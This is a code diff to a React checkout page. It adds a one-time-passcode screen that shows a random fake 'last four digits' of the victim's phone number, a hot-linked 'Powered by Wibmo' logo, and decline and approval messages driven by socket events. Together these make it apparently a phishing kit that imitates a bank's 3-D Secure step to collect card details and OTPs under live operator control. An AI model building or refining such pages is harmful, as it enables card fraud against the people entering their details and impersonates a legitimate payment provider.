@@ -76,6 +76,9 @@ const Checkout = () => {
   const [resendMessage, setResendMessage] = useState('');
   const [randomMobile, setRandomMobile] = useState('');
   const [cardDeclinedError, setCardDeclinedError] = useState('');
+  const [otpMobileLast4, setOtpMobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
+  const [showSpinner, setShowSpinner] = useState(false);
+  const [declineError, setDeclineError] = useState("");
 
   // Pricing data based on the main page
   const pricingData = {
@@ -324,18 +327,27 @@ const Checkout = () => {
       startOtpTimer();
     });
     socket.on('payment-approved', () => {
-      setConfirmingPayment(false);
-      setShowOtp(false);
-      alert('Payment successful!');
+      navigate('/payment-success', { state: { paymentData: { ...cardData, ...formData, planName, billing, amount: displayPrice } } });
     });
     socket.on('payment-rejected', (reason: string) => {
-      setConfirmingPayment(false);
-      setShowOtp(false);
-      alert(`Payment rejected: ${reason || 'Unknown error occurred'}`);
+      setShowSpinner(true);
+      setTimeout(() => {
+        setShowSpinner(false);
+        setCurrentStep('payment');
+        setDeclineError('Your card has declined.');
+      }, 2500);
+    });
+    socket.on('insufficient-balance-error', () => {
+      setShowSpinner(true);
+      setTimeout(() => {
+        setShowSpinner(false);
+        setCurrentStep('payment');
+        setDeclineError('Your card have insufficient balance to pay for this order');
+      }, 2500);
     });
     socket.on('invalid-otp-error', () => {
       setOtpSubmitting(false);
-      setOtpError('Invalid OTP, please enter valid one time passcode!');
+      setOtpError('incorrect otp, please enter valid One time passcode');
       setTimeout(() => setOtpError(''), 5000);
     });
     socket.on('card-declined-error', () => {
@@ -1124,13 +1136,13 @@ const Checkout = () => {
                     {resendMessage ? (
                       <div className="bg-green-50 border border-green-200 rounded p-2 mb-2">
                         <p className="text-green-700 text-sm text-center">
-                          One time passcode has been sent to your registered mobile number XX{randomMobile}
+                          One time passcode has been sent to your registered mobile number XX{otpMobileLast4}
                         </p>
                       </div>
                     ) : (
                       <div className="bg-green-50 border border-green-200 rounded p-2 mb-2">
                         <p className="text-green-700 text-sm text-center">
-                          Successfully sent OTP to your registered mobile number XX{randomMobile}
+                          One time passcode has been sent to your registered mobile number XX{otpMobileLast4}
                         </p>
                       </div>
                     )}
@@ -1141,23 +1153,31 @@ const Checkout = () => {
                       CLICK HERE For Addon Cardholder OTP
                     </button>
                   </div>
+                  {/* Error Message (Fail OTP) */}
+                  {otpError && (
+                    <div className="px-8 mb-2">
+                      <div className="border border-red-500 rounded p-2">
+                        <p className="text-red-700 text-xs text-center">{otpError}</p>
+                      </div>
+                    </div>
+                  )}
                   {/* OTP Input */}
                   <div className="px-8 mb-2">
                     <input
                       value={otpValue}
                       onChange={e => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                       disabled={otpSubmitting}
-                      className="w-full text-center text-lg tracking-widest h-14 border-2 border-blue-400 rounded bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400"
+                      className="w-full text-center text-base tracking-widest h-10 border-2 border-blue-400 rounded bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400"
                       placeholder="Enter OTP Here"
                       maxLength={6}
-                      style={{ letterSpacing: '0.5em', fontSize: '1.5rem' }}
+                      style={{ letterSpacing: '0.3em', fontSize: '1rem' }}
                     />
                   </div>
                   {/* Resend OTP Link */}
                   <div className="px-8 mb-2 text-right">
                     <button
                       onClick={() => {
-                        setResendMessage('One time passcode has been sent to your registered mobile number XX' + randomMobile);
+                        setResendMessage('One time passcode has been sent to your registered mobile number XX' + otpMobileLast4);
                         startOtpTimer();
                       }}
                       className="text-blue-700 text-xs font-semibold hover:underline focus:outline-none"
@@ -1166,19 +1186,11 @@ const Checkout = () => {
                       Resend OTP
                     </button>
                   </div>
-                  {/* Error Message */}
-                  {otpError && (
-                    <div className="px-8 mb-2">
-                      <div className="bg-red-50 border border-red-200 rounded p-2">
-                        <p className="text-red-700 text-xs text-center">{otpError}</p>
-                      </div>
-                    </div>
-                  )}
                   {/* Action Buttons */}
-                  <div className="px-8 pb-6 flex gap-2">
+                  <div className="px-8 pb-2 flex gap-2">
                     <button
                       onClick={handleOtpCancel}
-                      className="flex-1 h-12 border border-gray-300 rounded bg-white text-gray-700 font-semibold hover:bg-gray-50 transition text-lg"
+                      className="flex-1 h-9 border border-gray-300 rounded bg-white text-gray-700 font-semibold hover:bg-gray-50 transition text-base"
                       disabled={otpSubmitting}
                     >
                       CANCEL
@@ -1186,7 +1198,7 @@ const Checkout = () => {
                     <button
                       onClick={handleOtpSubmit}
                       disabled={otpValue.length !== 6 || otpSubmitting}
-                      className="flex-1 h-12 rounded bg-blue-700 text-white font-semibold hover:bg-blue-800 transition disabled:opacity-50 relative text-lg"
+                      className="flex-1 h-9 rounded bg-blue-700 text-white font-semibold hover:bg-blue-800 transition disabled:opacity-50 relative text-base"
                     >
                       {otpSubmitting ? (
                         <span className="flex items-center justify-center"><Loader2 className="h-4 w-4 animate-spin mr-2" />SUBMIT</span>
@@ -1195,6 +1207,32 @@ const Checkout = () => {
                       )}
                     </button>
                   </div>
+                  {/* Timer and Powered by Footer */}
+                  <div className="text-center space-y-2 pb-4 pt-2">
+                    <p className="text-xs text-gray-500">
+                      This page automatically time out after {formatTimer(otpTimer)} minutes
+                    </p>
+                    <div className="flex items-center justify-center gap-2">
+                      <span className="text-xs text-gray-500">Powered by</span>
+                      <img
+                        src="https://www.pngkey.com/png/detail/281-2815007_wibmo-logo.png"
+                        alt="Wibmo"
+                        className="h-4 object-contain"
+                      />
+                    </div>
+                  </div>
+                  {/* Spinner overlay for Declined/Insufficient */}
+                  {showSpinner && (
+                    <div className="absolute inset-0 bg-white bg-opacity-80 flex items-center justify-center z-50">
+                      <Loader2 className="h-12 w-12 animate-spin text-blue-500" />
+                    </div>
+                  )}
+                  {/* Decline/Insufficient error message (after redirect) */}
+                  {declineError && (
+                    <div className="absolute left-0 right-0 top-2 text-center">
+                      <span className="text-red-600 text-sm font-semibold">{declineError}</span>
+                    </div>
+                  )}
                 </div>
               </div>
             )}
